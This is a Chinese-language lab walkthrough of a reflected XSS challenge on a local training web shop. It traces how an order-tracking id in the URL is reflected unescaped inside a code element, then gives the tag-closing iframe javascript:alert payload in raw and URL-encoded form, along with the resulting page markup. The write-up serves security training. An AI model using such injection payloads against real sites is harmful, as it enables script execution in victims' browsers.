- Reflected XSS
    - 描述： 使用提供的攻击向量触发反射型 XSS
        ```html
        <iframe src="javascript:alert(`xss`)">
        ```
    - 教学模式1：使用“我的地址”功能
        - 在地址设置功能中对字段进行测试，上下文在 Angular Material 表格组件的文本段中被转义
            ```html
            <mat-cell _ngcontent-ng-c2206196967="" class="mat-mdc-cell mdc-data-table__cell cdk-cell cdk-column-Name mat-column-Name ng-star-inserted" role="cell"> &lt;p&gt; </mat-cell>
            ```
    - 教学模式2：完成购物流程后查看订单历史
        > ```在反射型XSS攻击中，负载通常包含在URI或HTTP参数中。注意url中的id参数。它可能容易受到反射型XSS攻击吗？尝试通过替换id参数的值为负载：<iframe src="javascript:alert('xss')">```
    - 教学模式1的内容为储存型 XSS，教程并非逐步指引而是设计不当，之后在靶场中忽略教学模式
        - 在订单历史中使用追踪订单功能
            ```http://127.0.0.1:3000/#/track-result?id=c5c3-4ec96e6a1294029a```
            对应在拦截代理服务器中看到的请求
            ```GET /rest/track-order/c5c3-4ec96e6a1294029a HTTP/1.1```
            订单 id 反射在页面上
            ```Search Results - c5c3-4ec96e6a1294029a```
            - URL 参数在 HTML 中的上下文为
                ```html
                <span _ngcontent-ng-c3321177673=""><code>c5c3-4ec96e6a1294029a</code></span>
                ```
            - 使用提供的攻击向量并关闭上下文的```<code>```标签，设置 URL 参数
                ```html
                </code><iframe src="javascript:alert(`xss`)"></iframe><code>
                ```
                输入
                ```http://127.0.0.1:3000/#/track-result?id=</code><iframe src="javascript:alert(`xss`)"></iframe><code>```
                浏览器将自动进行 URL 编码
                ```http://127.0.0.1:3000/#/track-result?id=%3C%2Fcode%3E%3Ciframe%20src%3D%22javascript:alert(%60xss%60)%22%3E%3C%2Fiframe%3E%3Ccode%3E```
            - 注入攻击向量后触发 XSS，上下文为
                ```html
                <span _ngcontent-ng-c3321177673="">
                    <code></code>
                    <iframe src="javascript:alert(`xss`)"></iframe>
                    <code></code>
                </span>
                ```
            - 直接使用示例攻击向量即可触发 XSS，```<code>```元素并不自动对文本段内容进行转义，且浏览器将自动补全框架元素的闭合标记```</iframe>```